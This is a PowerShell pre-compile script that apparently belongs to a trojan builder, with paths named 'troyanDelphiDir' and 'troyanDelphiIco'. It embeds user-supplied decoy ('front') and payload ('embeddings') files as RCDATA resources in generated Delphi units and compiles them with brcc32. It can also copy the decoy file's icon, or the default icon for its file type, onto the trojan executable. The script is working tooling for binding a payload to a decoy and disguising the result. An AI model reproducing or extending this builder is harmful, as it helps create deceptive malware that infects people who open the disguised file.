param (
    [string]$serverName
)
if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
& (Join-Path -Path $scriptDir -ChildPath "../../sys/current.ps1") -serverName $serverName

Write-Host "preCompile.embeddings"

if (-not ([System.Management.Automation.PSTypeName]'Win32Api').Type) {
    # Define the Win32Api type
    Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        using System.Text;

        public class Win32Api {
            [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
            public struct SHFILEINFO {
                public IntPtr hIcon;
                public int iIcon;
                public uint dwAttributes;
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst=260)]
                public string szDisplayName;
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst=80)]
                public string szTypeName;
            }

            public class Shell32 {
                public const uint SHGFI_ICON = 0x000000100;
                public const uint SHGFI_TYPENAME = 0x000000400;

                [DllImport("shell32.dll", CharSet=CharSet.Auto)]
                public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbSizeFileInfo, uint uFlags);

                [DllImport("User32.dll", CharSet=CharSet.Auto)]
                public static extern int DestroyIcon(IntPtr hIcon);
            }
        }
"@
}

Add-Type -AssemblyName System.Drawing

# Function to get default icon for a file extension
function Get-DefaultIconForExtension {
    param (
        [string] $Extension
    )

    $iconPath = [System.Text.StringBuilder]::new(260)
    $iconIndex = 0
    $SHGFI_ICON = 0x000000100
    $SHGFI_USEFILEATTRIBUTES = 0x000000010
    $SHGFI_ICONLOCATION = 0x000001000

    try {
        $shFileInfo = New-Object Win32Api+SHFILEINFO
        $null = [Win32Api+Shell32]::SHGetFileInfo("$Extension", 0, [ref]$shFileInfo, [int32]([System.Runtime.InteropServices.Marshal]::SizeOf($shFileInfo)), $SHGFI_ICON -bor $SHGFI_USEFILEATTRIBUTES -bor $SHGFI_ICONLOCATION)

        $icon = [System.Drawing.Icon]::FromHandle($shFileInfo.hIcon).Clone()
        [Win32Api+Shell32]::DestroyIcon($shFileInfo.hIcon) | Out-Null

        if ($icon -ne $null) {
            return $icon
        } else {
            Write-Host "Failed to get icon for $Extension" -ForegroundColor Red
        }
    } catch {
        Write-Host "Error occurred: $_" -ForegroundColor Red
    }

    return $null
}

function Extract-IconFromExe {
    param (
        [string] $FilePath
    )

    try {
        $icon = [System.Drawing.Icon]::ExtractAssociatedIcon($FilePath)
        if ($icon -ne $null) {
            return $icon
        } else {
            Write-Host "Failed to extract icon from $FilePath" -ForegroundColor Red
        }
    } catch {
        Write-Host "Error occurred: $_" -ForegroundColor Red
    }

    return $null
}

function Extract-Icon
{
    param (
        [string] $filePath,
        [string] $outPath
    )
    $fileExtension = [System.IO.Path]::GetExtension($filePath)
    if ($fileExtension -eq ".exe") 
    {
        $icon = Extract-IconFromExe -FilePath $filePath
        if ($icon -ne $null) {
            try {
                $fileStream = [System.IO.File]::OpenWrite($outPath)
                $icon.Save($fileStream)
                $fileStream.Close()
            } catch {
                Write-Host "Failed to save icon to $outPath"
            } finally {
                $icon.Dispose()
            }
        }
    } 
    else 
    {
        $icon = Get-DefaultIconForExtension -Extension $fileExtension
        if ($icon -ne $null) 
        {
            try {
            
                $fileStream = [System.IO.File]::OpenWrite($outPath)
                $icon.Save($fileStream)
                $fileStream.Close()
            } catch {
                Write-Host "Failed to save icon to $outPath"
            } finally 
            {
                $icon.Dispose()
            }
        }
    }
}



$server = $global:server;
#delphi embeddings
function Create-EmbeddingFiles {
    param (
        [string]$name,
        [int]$startIndex
    )

    $srcFolder = Join-Path -Path $server.userDataDir -ChildPath "$name"

    $rcFile = Join-Path -Path $server.troyanDelphiDir -ChildPath "_$name.rc"
    $delphiFile = Join-Path -Path $server.troyanDelphiDir -ChildPath "_$name.pas"
    $unitName = "_$name";

    if (-not (Test-Path -Path $server.userDelphiIco))
    {
        Copy-Item -Path $server.defaultIco -Destination $server.troyanDelphiIco -Force
    } else {
        Copy-Item -Path $server.userDelphiIco -Destination $server.troyanDelphiIco -Force
    }

    if (-not (Test-Path -Path $srcFolder))
    {
        $files = @()
    } else
    {
        $files = (Get-ChildItem -Path $srcFolder -File) 
    }
    if ($null -eq $files){
        $files = @()
    }
    if (-not ($files.GetType().Name -eq 'Object[]')) {
        $files = @($files)
    }
    
    $idx=$startIndex;
    $rcContent = ""
    $delphiArray = @()
    foreach ($file in $files) {
        if ($name -eq "front")
        {
            if ($server.extractIconFromFront -eq $true){
                Extract-Icon -filePath $file.FullName -outPath $server.troyanDelphiIco
            }
        }
        $filename = [System.IO.Path]::GetFileName($file.FullName)
        $fx = $file.FullName
        $rcContent = $rcContent + "$idx RCDATA ""$fx"""+ [System.Environment]::NewLine
        $idx++
        $delphiArray += "'" + $filename + "'"
    }
    Copy-Item -Path $server.troyanDelphiIco -Destination $server.userDelphiIco -Force

    $template = @"
unit NAME;

interface

const
xembeddings: array[0..NUMBER] of string = (CONTENT);

implementation

end.
"@

    $encoding = New-Object System.Text.UTF8Encoding $false 
    $streamWriter = New-Object System.IO.StreamWriter($rcFile, $false, $encoding)
    $streamWriter.Write($rcContent)
    $streamWriter.Close()

    & "C:\Program Files (x86)\Borland\Delphi7\Bin\brcc32.exe" "$rcFile"

    $number = $files.Length-1
    if ($number -lt 0) {
        $number = 0
    }
    $content = ($delphiArray -join ', ')
    if ($content -eq ""){
        $content="''"
    }

    $template  = $template -replace "CONTENT", $content
    $template  = $template -replace "NAME", $unitName
    $template  = $template -replace "NUMBER", $number.ToString()

    $encoding = New-Object System.Text.UTF8Encoding $false 
    $streamWriter = New-Object System.IO.StreamWriter($delphiFile, $false, $encoding)
    $streamWriter.Write($template)
    $streamWriter.Close()
}


Create-EmbeddingFiles -name "front" -startIndex 8000
Create-EmbeddingFiles -name "embeddings" -startIndex 9000